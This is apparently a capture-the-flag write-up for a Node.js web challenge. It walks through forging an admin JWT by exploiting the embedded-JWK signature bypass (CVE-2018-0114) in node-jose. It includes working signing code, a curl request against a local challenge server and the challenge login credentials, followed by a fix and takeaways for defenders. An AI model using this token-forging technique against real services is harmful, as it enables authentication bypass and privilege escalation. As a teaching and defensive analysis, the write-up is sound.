# Dasbod Challenge - Deep Analysis

## Challenge Info
- **Category:** Access Control (CVE)
- **Points:** 80
- **Mission:** Akses dashboard Admin
- **Credentials:** WanZKey:anyaunyu
- **Flag format:** pwn{...}

## Source Code Analysis

### Key Components

#### 1. Login Flow (server.js lines 36-56)
```javascript
app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    if (username === USERNAME && password === PASSWORD) {
        // Create RSA key for signing
        const keystore = jose.JWK.createKeyStore();
        const key = await keystore.generate('RSA', 2048, { alg: 'RS256', use: 'sig' });

        // ⚠️ Non-standard payload - just base64 encoded username
        const payload = Buffer.from(username).toString('base64');

        // ⚠️ JWT with jwk in header!
        const token = await jose.JWS.createSign(
            { format: 'compact', fields: { alg: 'RS256', typ: 'JWT', jwk: key.toJSON() } },
            key
        )
            .update(payload)
            .final();

        res.cookie('token', token, { httpOnly: true, maxAge: 3600000 });
        res.redirect('/dashboard');
    }
});
```

**Critical Findings:**
1. ✅ JWT signed with **RS256 (RSA)**
2. ⚠️ **jwk (public key) embedded in JWT header!**
3. ⚠️ Payload is just base64 encoded username (not JSON!)
4. ⚠️ New RSA key generated on **every login**

#### 2. Dashboard/Verification (server.js lines 64-100)
```javascript
app.get('/dashboard', async (req, res) => {
    const token = req.cookies.token;

    try {
        // ⚠️ Verify WITHOUT specifying which key to use!
        const result = await jose.JWS.createVerify().verify(token);

        const payloadStr = result.payload.toString('utf8');
        let username = payloadStr;
        let role = 'user';

        try {
            // Try to parse as JSON
            const payloadObj = JSON.parse(payloadStr);
            username = payloadObj.username || payloadObj.sub || username;
            role = payloadObj.role || 'user';  // ⚠️ Role from payload!
        } catch (e) {
            // If not JSON, try base64 decode
            try {
                username = Buffer.from(payloadStr, 'base64').toString('utf8');
            } catch (e2) {
            }
        }

        // ⚠️ Role check for admin access
        if (role === 'admin') {
            html = html.replace('{{flag}}', `<div class="flag">${FLAG}</div>`);
        } else {
            html = html.replace('{{flag}}', '');
            html = html.replace(
                '{{admin-content}}',
                '<div class="message error">Access Restricted...</div>'
            );
        }
    }
});
```

**Critical Findings:**
1. ⚠️ **jose.JWS.createVerify().verify(token)** - no key specified!
2. ✅ If payload is JSON and has `role: 'admin'` → FLAG revealed!
3. ⚠️ Flexible payload parsing (JSON or base64)

---

## 🚨 VULNERABILITY: CVE-2018-0114 (Embedded JWK Attack)

### The Vulnerability

**node-jose** library vulnerability:
- When `jwk` is present in JWT header
- And no key is specified in `verify()`
- **Library uses the jwk from header to verify signature!**

This means:
1. Attacker creates their own RSA key pair
2. Signs JWT with their **private key**
3. Embeds their **public key** in `jwk` header
4. Server uses attacker's public key to verify!
5. **Verification passes!** ✅

### Attack Flow

```
1. Generate our own RSA key pair
   ├── Private key (for signing)
   └── Public key (embed in jwk)

2. Create malicious JWT:
   ├── Header: { alg: 'RS256', typ: 'JWT', jwk: OUR_PUBLIC_KEY }
   └── Payload: { role: 'admin', username: 'WanZKey' }

3. Sign with our private key

4. Send to server

5. Server verifies with our public key (from jwk)
   └── ✅ Signature valid!

6. Server extracts role = 'admin'
   └── 🚩 FLAG REVEALED!
```

---

## Exploitation Strategy

### Step 1: Generate RSA Key Pair
```javascript
const jose = require('node-jose');

const keystore = jose.JWK.createKeyStore();
const key = await keystore.generate('RSA', 2048, { alg: 'RS256', use: 'sig' });
```

### Step 2: Create Malicious Payload
```javascript
const payload = JSON.stringify({
    username: 'WanZKey',
    role: 'admin'  // 🔑 Critical!
});
```

### Step 3: Sign JWT with jwk in Header
```javascript
const token = await jose.JWS.createSign(
    { 
        format: 'compact',
        fields: { 
            alg: 'RS256',
            typ: 'JWT',
            jwk: key.toJSON()  // Embed our public key!
        }
    },
    key
)
    .update(payload)
    .final();
```

### Step 4: Send to Server
```bash
curl http://localhost:1337/dashboard \
  -H "Cookie: token=MALICIOUS_JWT"
```

---

## Defense Analysis

### Why This Works

**Vulnerable Code:**
```javascript
// No key specified → uses jwk from header!
const result = await jose.JWS.createVerify().verify(token);
```

**Secure Code:**
```javascript
// Use server's own key for verification
const serverKey = getServerPublicKey();
const result = await jose.JWS.createVerify(serverKey).verify(token);
```

---

## CVE Details

**CVE-2018-0114:**
- Affects: node-jose library (and similar JWT libraries)
- Type: Signature bypass via embedded JWK
- Impact: Authentication bypass, privilege escalation
- Fix: Always specify verification key, ignore jwk header

**Related CVEs:**
- CVE-2015-9235 (jwt-simple)
- CVE-2018-1000531 (pyjwt)
- Similar pattern across many JWT libraries

---

## Exploit Requirements

1. Node.js with `node-jose` package
2. Ability to generate RSA keys
3. Craft JWT with:
   - `jwk` in header (our public key)
   - `role: 'admin'` in payload
   - Valid signature (our private key)

---

## Expected Result

When successful:
```html
<h1>admin Dashboard</h1>
<div class="user-info">Logged in as: WanZKey</div>
<div class="flag">pwn{...}</div>
```

---

## Key Takeaways

1. **Never trust JWT header parameters** (alg, kid, jwk, etc.)
2. **Always specify verification key** explicitly
3. **Validate JWT structure** before processing
4. **Don't embed keys in tokens** - use key management
5. This is a **real CVE** that affected production systems!

---

## Challenge Difficulty: Medium-Hard (80 points)

**Why?**
- Requires understanding of:
  1. JWT structure (header + payload + signature)
  2. Asymmetric cryptography (RSA)
  3. Specific CVE knowledge (embedded JWK attack)
  4. node-jose library behavior
  
- Not obvious without knowing the CVE
- Real-world vulnerability pattern
